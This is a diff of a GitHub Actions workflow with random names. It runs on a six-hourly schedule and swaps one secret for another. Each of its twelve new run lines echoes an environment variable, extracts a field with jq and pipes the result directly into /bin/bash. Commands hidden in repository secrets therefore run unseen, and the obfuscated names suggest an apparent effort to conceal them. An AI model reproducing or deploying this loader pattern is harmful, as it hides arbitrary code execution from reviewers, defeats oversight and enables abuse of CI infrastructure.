@@ -2,8 +2,7 @@ name: zhubanguan3579
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 5/6 * * *'
-
+    - cron: '59 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,16 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhubanguan3579
         env:
-          ov0: ${{ secrets.ov0 }}
+          lpfa571: ${{ secrets.lpfa571 }}
         run: |
-          echo $ov0 | jq -r .en8 | /bin/bash
-          echo $dan3064 | jq -r .kdm82 | /bin/bash
-          echo $dd0155 | jq -r .r54648 | /bin/bash
-          echo $uf754 | jq -r .dgl86230 | /bin/bash
-          echo $tyjhc844 | jq -r .sobas36222 | /bin/bash
-          echo $cnf006 | jq -r .oqw0203 | /bin/bash
-          echo $ha249 | jq -r .ychwr88 | /bin/bash
-          echo $pbjz3240 | jq -r .f84 | /bin/bash
-          echo $xmatu09 | jq -r .pgake71 | /bin/bash
-          echo $ztyf01166 | jq -r .vglaj7729 | /bin/bash
+          echo $lpfa571 | jq -r .kptzu26 | /bin/bash
+          echo $asm42339 | jq -r .dtuuq114 | /bin/bash
+          echo $k28772 | jq -r .oiyt503 | /bin/bash
+          echo $hdyqw421 | jq -r .z23699 | /bin/bash
+          echo $e1 | jq -r .ex22151 | /bin/bash
+          echo $wf6 | jq -r .swuy36 | /bin/bash
+          echo $lnr0845 | jq -r .r4 | /bin/bash
+          echo $oul308 | jq -r .k802 | /bin/bash
+          echo $s9100 | jq -r .xex9110 | /bin/bash
+          echo $fima47 | jq -r .f212 | /bin/bash
+          echo $ki93 | jq -r .qu458 | /bin/bash
+          echo $m35 | jq -r .kkh3 | /bin/bash
 
